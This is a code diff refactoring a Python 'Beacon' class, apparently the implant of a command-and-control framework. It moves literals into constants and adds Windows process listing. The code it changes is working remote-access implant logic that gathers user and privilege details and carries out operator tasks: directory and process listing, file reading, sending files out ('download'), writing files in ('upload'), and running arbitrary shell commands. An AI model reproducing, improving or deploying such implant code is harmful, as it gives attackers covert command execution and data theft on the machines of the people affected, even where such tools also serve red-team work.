@@ -11,6 +11,35 @@ from typing import Dict, List
 
 CHARACTER_POOL = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
 
+COMMAND_WHOAMI = "whoami"
+
+# Instruction identifiers
+INSTRUCTION_LS = "ls"
+INSTRUCTION_PS = "ps"
+INSTRUCTION_CD = "cd"
+INSTRUCTION_PWD = "pwd"
+INSTRUCTION_CAT = "cat"
+INSTRUCTION_DOWNLOAD = "download"
+INSTRUCTION_UPLOAD = "upload"
+INSTRUCTION_RUN = "run"
+INSTRUCTION_SLEEP = "sleep"
+INSTRUCTION_END = "end"
+
+# Miscellaneous command strings
+DEFAULT_LIST_DIRECTORY = "."
+FILE_TYPE_FILE = "f"
+FILE_TYPE_DIRECTORY = "d"
+UNKNOWN_OWNER = "unknown"
+UNKNOWN_GROUP = "unknown"
+PERMISSION_SLICE_START = -3
+
+# Platform specific process listing commands
+PS_COMMAND_LINUX = "ps -aux"
+PS_COMMAND_WINDOWS = "tasklist"
+WINDOWS_PLATFORM_PREFIX = "win"
+
+SLEEP_SECONDS_TO_MILLISECONDS = 1000
+
 # Beacon bundle keys
 BUNDLE_KEY_BEACON_HASH = "BH"
 BUNDLE_KEY_LISTENER_HASH = "LH"
@@ -48,7 +77,6 @@ DEFAULT_UPLOAD_SUCCESS = "File uploaded."
 DEFAULT_UPLOAD_FAILURE = "Upload failed."
 DEFAULT_EMPTY_RESPONSE = "Empty response."
 DEFAULT_UNKNOWN_COMMAND = "cmd unknown."
-PS_COMMAND = "ps -aux"
 ERROR_NO_SUCH_FILE_PREFIX = "No such file or directory: "
 
 
@@ -78,7 +106,7 @@ class Beacon:
         self.arch = ""
         self.privilege = ""
         self.os = ""
-        self.sleepTimeMs = 1000
+        self.sleepTimeMs = SLEEP_SECONDS_TO_MILLISECONDS
 
         self.tasks: List[Dict[str, object]] = []
         self.taskResults: List[Dict[str, object]] = []
@@ -90,7 +118,12 @@ class Beacon:
         try:
             self.username = os.getlogin()
         except:
-            self.username = subprocess.run(["whoami"], shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE).stdout.decode('utf-8')
+            self.username = subprocess.run(
+                COMMAND_WHOAMI,
+                shell=True,
+                stderr=subprocess.STDOUT,
+                stdout=subprocess.PIPE,
+            ).stdout.decode("utf-8")
         self.arch = platform.machine()
         if self.username == ROOT_USERNAME:
             self.privilege = DEFAULT_PRIVILEGE_ROOT
@@ -313,44 +346,72 @@ class Beacon:
                 data = data.encode("utf-8")
 
             result = ""
-            if instruction == "ls":
+            if instruction == INSTRUCTION_LS:
                 if cmd == "":
-                    cmd = "."
+                    cmd = DEFAULT_LIST_DIRECTORY
                 try:
                     dic = os.listdir(cmd)
                     for entry in dic:
-                        isFile = "f"
-                        if os.path.isfile(cmd+"/"+entry):
-                            isFile = "f"
-                        elif os.path.isdir(cmd+"/"+entry):
-                            isFile = "d"
-                        mask = oct(os.stat(cmd+"/"+entry).st_mode)[-3:]
-                        path = Path(cmd+"/"+entry)
-                        owner = path.owner()
-                        group = path.group()
-                        result += isFile + mask + " " + owner + " " + group + " " + cmd+"/"+entry
+                        target_path = os.path.join(cmd, entry)
+                        if os.path.isfile(target_path):
+                            file_type = FILE_TYPE_FILE
+                        elif os.path.isdir(target_path):
+                            file_type = FILE_TYPE_DIRECTORY
+                        else:
+                            file_type = FILE_TYPE_FILE
+
+                        mask = oct(os.stat(target_path).st_mode)[PERMISSION_SLICE_START:]
+                        path = Path(target_path)
+                        try:
+                            owner = path.owner()
+                        except Exception:
+                            owner = UNKNOWN_OWNER
+                        try:
+                            group = path.group()
+                        except Exception:
+                            group = UNKNOWN_GROUP
+                        result += (
+                            file_type
+                            + mask
+                            + " "
+                            + owner
+                            + " "
+                            + group
+                            + " "
+                            + target_path
+                        )
                         result += "\n"
                 except:
                     result = ERROR_NO_SUCH_FILE_PREFIX + cmd
 
-            elif instruction == "ps":
-                result = subprocess.run([PS_COMMAND], shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE).stdout.decode('utf-8')
+            elif instruction == INSTRUCTION_PS:
+                ps_command = (
+                    PS_COMMAND_WINDOWS
+                    if self.os.lower().startswith(WINDOWS_PLATFORM_PREFIX)
+                    else PS_COMMAND_LINUX
+                )
+                result = subprocess.run(
+                    ps_command,
+                    shell=True,
+                    stderr=subprocess.STDOUT,
+                    stdout=subprocess.PIPE,
+                ).stdout.decode("utf-8")
 
-            elif instruction == "cd":
+            elif instruction == INSTRUCTION_CD:
                 os.chdir(cmd)
                 result = os.getcwd()
 
-            elif instruction == "pwd":
+            elif instruction == INSTRUCTION_PWD:
                 result = os.getcwd()
 
-            elif instruction == "cat":
+            elif instruction == INSTRUCTION_CAT:
                 if os.path.isfile(inputFile):
                     f = open(inputFile, "rb")
                     data = f.read()
                     f.close()
                     result = data.decode('utf-8')
 
-            elif instruction == "download":
+            elif instruction == INSTRUCTION_DOWNLOAD:
                 if os.path.isfile(inputFile):
                     try:
                         f = open(inputFile, "rb")
@@ -362,7 +423,7 @@ class Beacon:
                 else:
                     result = DEFAULT_DOWNLOAD_FAILURE
 
-            elif instruction == "upload":
+            elif instruction == INSTRUCTION_UPLOAD:
                 try:
                     f = open(outputFile, "wb")
                     f.write(data)
@@ -371,16 +432,21 @@ class Beacon:
                 except:
                     result = DEFAULT_UPLOAD_FAILURE
 
-            elif instruction == "run":
-                result = subprocess.run([cmd], shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE).stdout.decode('utf-8')
+            elif instruction == INSTRUCTION_RUN:
+                result = subprocess.run(
+                    cmd,
+                    shell=True,
+                    stderr=subprocess.STDOUT,
+                    stdout=subprocess.PIPE,
+                ).stdout.decode('utf-8')
                 if not result:
                     result = DEFAULT_EMPTY_RESPONSE
 
-            elif instruction == "sleep":
-                self.sleepTimeMs=int(cmd)*1000
+            elif instruction == INSTRUCTION_SLEEP:
+                self.sleepTimeMs=int(cmd)*SLEEP_SECONDS_TO_MILLISECONDS
                 result = cmd
 
-            elif instruction == "end":
+            elif instruction == INSTRUCTION_END:
                 exit(0)
 
             else:
